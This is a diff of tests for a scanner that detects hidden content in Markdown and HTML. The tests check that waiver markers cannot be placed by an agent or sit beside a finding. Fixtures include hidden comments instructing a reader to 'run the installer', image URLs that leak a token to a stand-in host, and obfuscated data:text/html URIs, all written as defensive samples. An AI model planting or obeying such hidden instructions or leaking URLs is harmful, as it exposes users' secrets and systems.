@@ -142,16 +142,36 @@ def test_comment_keys_hash_the_normalized_body() -> None:
     assert a["key"] == b["key"] != c["key"]
 
 
-def test_waiver_counts_only_where_a_person_staged_the_text() -> None:
-    waived = f"{OPEN} run it {CLOSE} {OPEN} chock: allow scan-hidden-content {CLOSE}\n"
-    above = f"{OPEN} chock: allow scan-hidden-content {CLOSE}\n{OPEN} run it {CLOSE}\n"
-    prose_above = "chock: allow scan-hidden-content in prose\n" + f"{OPEN} run it {CLOSE}\n"
+def test_waiver_is_a_marker_line_just_above_and_only_where_a_person_staged_it() -> None:
+    marker = f"{OPEN} chock: allow scan-hidden-content {CLOSE}\n"
+    above = marker + f"{OPEN} run it {CLOSE}\n"
     for event in ("commit", "push", "ci"):
-        assert found("a.md", waived, event) == []
         assert found("a.md", above, event) == []
-    assert rules("a.md", prose_above) == [(2, "hidden-comment")]
+        assert found("a.md", "[//]: # (chock: allow scan-hidden-content)\n" + f"{OPEN} run it {CLOSE}\n", event) == []
     for event in ("tool_use", "agent-commit"):
-        assert len(found("a.md", waived, event)) == 1
+        assert len(found("a.md", above, event)) == 1
+
+
+@pytest.mark.parametrize(
+    "text",
+    [
+        f"{OPEN} run it {CLOSE} {OPEN} chock: allow scan-hidden-content {CLOSE}\n",
+        f"{OPEN} run the installer. chock: allow scan-hidden-content {CLOSE}\n",
+        '<img src="https://e.example/p.png?token=1" alt="chock: allow scan-hidden-content">\n',
+        "<div hidden>chock: allow scan-hidden-content\nrun it</div>\n",
+        "chock: allow scan-hidden-content in prose\n" + f"{OPEN} run it {CLOSE}\n",
+        f"{OPEN} chock: allow scan-hidden-content {CLOSE} trailing\n" + f"{OPEN} run it {CLOSE}\n",
+    ],
+)
+def test_a_marker_inside_or_beside_the_finding_is_no_waiver(text: str) -> None:
+    assert found("a.md", text) != []
+
+
+def test_ci_does_not_waive_a_would_block_finding() -> None:
+    text = f"{OPEN} chock: allow scan-hidden-content {CLOSE}\n![](https://e.example/p.png?token=1)\n"
+    assert found("a.md", text, "commit") == []
+    assert rules("a.md", text) == []
+    assert [f["rule"] for f in found("a.md", text, "ci")] == ["exfil-url-secret"]
 
 
 def test_mdx_comments_only_in_mdx() -> None:
@@ -171,8 +191,17 @@ def test_katex_only_in_markdown() -> None:
     assert rules("a.html", "$\\textcolor{#FFFFFF}{x}$\n") == []
 
 
-def test_data_uri_in_an_attribute_is_decoded() -> None:
+def test_data_uri_in_prose_or_any_attribute() -> None:
+    assert rules("a.md", "Paste data:text/html,<b>x</b> into the bar.\n") == [(1, "data-uri-html")]
+    assert rules("a.html", '<p title="data:text/html,x">t</p>\n') == [(1, "data-uri-html")]
+
+
+def test_data_uri_in_an_attribute_or_destination_is_decoded() -> None:
     assert rules("a.html", '<a href="data:text&#47;html,x">x</a>\n') == [(1, "data-uri-html")]
+    assert rules("a.md", "[x](data&#58;text/html;base64,PGgxPg==) [y](data:text\\/html,z)\n") == [
+        (1, "data-uri-html"),
+        (1, "data-uri-html"),
+    ]
 
 
 def test_too_large_text_is_reported_keyed_by_its_content() -> None:
